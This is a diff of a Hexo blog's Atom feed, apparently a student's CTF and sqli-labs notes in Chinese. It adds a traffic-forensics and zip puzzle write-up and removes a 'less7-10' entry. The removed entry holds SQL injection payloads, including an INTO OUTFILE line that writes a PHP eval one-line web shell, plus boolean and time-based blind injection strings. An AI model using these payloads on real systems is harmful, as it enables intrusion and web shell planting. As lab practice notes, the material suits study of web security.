@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-24T03:47:43.946Z</updated>
+  <updated>2022-02-26T08:23:37.422Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,54 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>misc考核</title>
+    <link href="http://example.com/2022/02/26/misc%E8%80%83%E6%A0%B8/"/>
+    <id>http://example.com/2022/02/26/misc%E8%80%83%E6%A0%B8/</id>
+    <published>2022-02-26T07:56:43.000Z</published>
+    <updated>2022-02-26T08:23:37.422Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="一道目标明确的流量包取证"><a href="#一道目标明确的流量包取证" class="headerlink" title="一道目标明确的流量包取证"></a>一道目标明确的流量包取证</h1><p>首先用wireshark打开流量包一看是get型请求的联合查询注入，搜索http来过滤信息</p><p><img src="https://s2.loli.net/2022/02/26/xmu52Gs7EHyw9p6.png" alt="QQ截图20220226104603.png"></p><p>然后就打开ok后缀的请求包（肯定是从后往前找）</p><p>率先找到后半段flag</p><img src="https://s2.loli.net/2022/02/26/P1FfvW9am3DUoB5.png" alt="QQ截图20220226101554.png" style="zoom:200%;" /><p>往前找还有前半段</p><img src="https://s2.loli.net/2022/02/26/v3CpGuLYkd7R84N.png" alt="QQ截图20220226103012.png" style="zoom:200%;" /><p>千万别急，有坑啊，发现前半段和后半段都有重复的地方，所以组合起来是：flag{698b0a3e29c5b0861a2d85fb14c2e2e9}</p><p>之前在buu上刷过一题更难的一题，有点类似，是叫sqltest的基于get型的时间盲注的流量包取证有点小离谱</p><h1 id="一道令人头皮发麻的签到："><a href="#一道令人头皮发麻的签到：" class="headerlink" title="一道令人头皮发麻的签到："></a>一道令人头皮发麻的签到：</h1><p>好！签到题，自信满满的打开，第一层解压：flag在里面哦</p><p>第二层：打开看看（zip伪加密）</p><p>第三层：你这么聪明看看就懂了  乱码，好！直接夹断😂</p><p>原本想一个一个去试一试，试一下是啥编码的但是看到</p><img src="https://s2.loli.net/2022/02/26/NMQc483tLwuKTB5.png" alt="QQ截图20220226161808.png" style="zoom;" /><p>5m在打开的一瞬间我的电脑卡了，所有的在线翻译网站都被搞爆了，就离谱😂</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;一道目标明确的流量包取证&quot;&gt;&lt;a href=&quot;#一道目标明确的流量包取证&quot; class=&quot;headerlink&quot; title=&quot;一道目标明确的流量包取证&quot;&gt;&lt;/a&gt;一道目标明确的流量包取证&lt;/h1&gt;&lt;p&gt;首先用wireshark打开流量包一看是get型请求的联合查</summary>
+      
+    
+    
+    
+    <category term="misc" scheme="http://example.com/categories/misc/"/>
+    
+    
+    <category term="兼职miscer" scheme="http://example.com/tags/%E5%85%BC%E8%81%8Cmiscer/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>upload-libs2</title>
+    <link href="http://example.com/2022/02/24/upload-libs(2)/"/>
+    <id>http://example.com/2022/02/24/upload-libs(2)/</id>
+    <published>2022-02-24T03:51:46.000Z</published>
+    <updated>2022-02-24T03:57:24.813Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="upload-libs-4-黑名单"><a href="#upload-libs-4-黑名单" class="headerlink" title="upload-libs 4 (黑名单)"></a>upload-libs 4 (黑名单)</h1><p><img src="https://s2.loli.net/2022/02/24/ZqJVp4rcituwjWg.png" alt="QQ截图20220224115441.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;upload-libs-4-黑名单&quot;&gt;&lt;a href=&quot;#upload-libs-4-黑名单&quot; class=&quot;headerlink&quot; title=&quot;upload-libs 4 (黑名单)&quot;&gt;&lt;/a&gt;upload-libs 4 (黑名单)&lt;/h1&gt;&lt;p&gt;&lt;img s</summary>
+      
+    
+    
+    
+    <category term="upload-libs" scheme="http://example.com/categories/upload-libs/"/>
+    
+    
+    <category term="upload-libs" scheme="http://example.com/tags/upload-libs/"/>
+    
+  </entry>
   
   <entry>
     <title>upload-libs</title>
@@ -307,19 +355,6 @@
   </entry>
   
   <entry>
-    <title></title>
-    <link href="http://example.com/2021/11/28/Untitled/"/>
-    <id>http://example.com/2021/11/28/Untitled/</id>
-    <published>2021-11-28T01:32:43.048Z</published>
-    <updated>2021-11-28T01:32:43.048Z</updated>
-    
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
     <title>lesson18-23</title>
     <link href="http://example.com/2021/11/28/lesson18/"/>
     <id>http://example.com/2021/11/28/lesson18/</id>
@@ -451,31 +486,6 @@
       
     <summary type="html">&lt;h1 id=&quot;less-11&quot;&gt;&lt;a href=&quot;#less-11&quot; class=&quot;headerlink&quot; title=&quot;less 11&quot;&gt;&lt;/a&gt;less 11&lt;/h1&gt;&lt;p&gt;这关让我们输入账号密码，而不是简单的?id=1，所以直接夹断.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;h</summary>
-      
-    
-    
-    
-    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
-    
-    
-    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>less7-10</title>
-    <link href="http://example.com/2021/11/04/less7-8/"/>
-    <id>http://example.com/2021/11/04/less7-8/</id>
-    <published>2021-11-04T09:53:22.000Z</published>
-    <updated>2021-11-04T10:13:03.571Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="less7（一句话木马的利用）"><a href="#less7（一句话木马的利用）" class="headerlink" title="less7（一句话木马的利用）"></a>less7（一句话木马的利用）</h1><p>首先按部就班试出</p><p>？id=1‘))–+</p><p>利用order by查出数据库列数 </p><p>提示是use outfile </p><p>into outfile 是写文件的指令，资料<a href="https://blog.csdn.net/cuiruidu3106/article/details/100439103?utm_source=app&app_version=4.17.2&code=app_1562916241&uLinkId=usr1mkqgl919blen">引用csdn的大佬</a></p><p>利用union select 1,2,‘&lt;?php @eval($_post[“crow”]);？&gt;’ into outfile “D:\phpstudy_pro\WWW\sqli-labs\Less-7\a.php”–+将一句话木马写入</p><p><img src="https://i.loli.net/2021/11/04/xWTdpgA8jq5eXht.png" alt="QQ截图20211104171541.png"></p><p>这里报错了没事，现在文件已经写到我们想要的地方</p><p><img src="https://i.loli.net/2021/11/04/jZrFiNRp9PG4Az1.png" alt="QQ截图20211104173133.png"></p><p>然后使用菜刀访问即可！</p><p><img src="https://i.loli.net/2021/11/04/wWXQb2Tgo8EDuBJ.png" alt="QQ截图20211104171109.png"></p><p>ps：操作前提该网站允许文件的读入操作，不然会一直报错且菜刀也访问不到文件。</p><h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><h2 id="方法一-布尔盲注"><a href="#方法一-布尔盲注" class="headerlink" title="方法一 布尔盲注"></a>方法一 布尔盲注</h2><p>输入？id=1‘判断存在注入错误</p><p>输入？id=1’ order by 3–+ 当3改成4时报错说明只有4列</p><p>输入？id=1‘and left（（database（）），1）=’s‘–+ 猜出第一位</p><p>或者采用？id=1’‘and ascii（substr（（database（）），1,1））&gt;16</p><p>或者输入？id=1’ and ascii((select schema_name from information_schema.schemata limit 1,1)1,1)&gt;17–+也可以回应，判断数据库名</p><p>输入？id=1‘and acii（（select table_name from information_schema.tables where table_schema=’scurity’））&gt;115–+判断表名</p><p>输入？id=1’and ascii（（select column_name from information_schema.columns where table_name=’user’））&gt;10–+判断表中字段。</p><p>以上语句配合burpsuite进行使用（与lesson5,6同理）。</p><h2 id="法二-时间盲注"><a href="#法二-时间盲注" class="headerlink" title="法二 时间盲注"></a>法二 时间盲注</h2><p>？id=1‘ and sleep（5）–+判断存在注入 如果可以会延迟5秒回应（对比可见延迟）</p><p><img src="https://i.loli.net/2021/11/04/2d5OTQ68ZArtSMz.png" alt="QQ截图20211104174905.png"></p><p><img src="https://i.loli.net/2021/11/04/xYsm5MioZyjcPFr.png" alt="QQ截图20211104175501.png"></p><p>输入？id=1‘ and if(length(database())=8,1,sleep(5))–+如果为8则页面会较快的刷新，如果不为8则会延迟5秒刷新</p><p>输入？id=1’ and if（ascii（substr（select database（），1,1））&gt;113,1,sleep(5))–+如果当前数据库的第一个字母的ascii值大于113的时候，会立刻返回结果，否则执行5秒</p><h1 id="less-9和less-10"><a href="#less-9和less-10" class="headerlink" title="less 9和less 10"></a>less 9和less 10</h1><p>less9和less10中可以使用时间盲注但不可以使用布尔盲注，less10只是将单引号改成了双引号</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;less7（一句话木马的利用）&quot;&gt;&lt;a href=&quot;#less7（一句话木马的利用）&quot; class=&quot;headerlink&quot; title=&quot;less7（一句话木马的利用）&quot;&gt;&lt;/a&gt;less7（一句话木马的利用）&lt;/h1&gt;&lt;p&gt;首先按部就班试出&lt;/p&gt;
-&lt;p&gt;？i</summary>
       
     
     
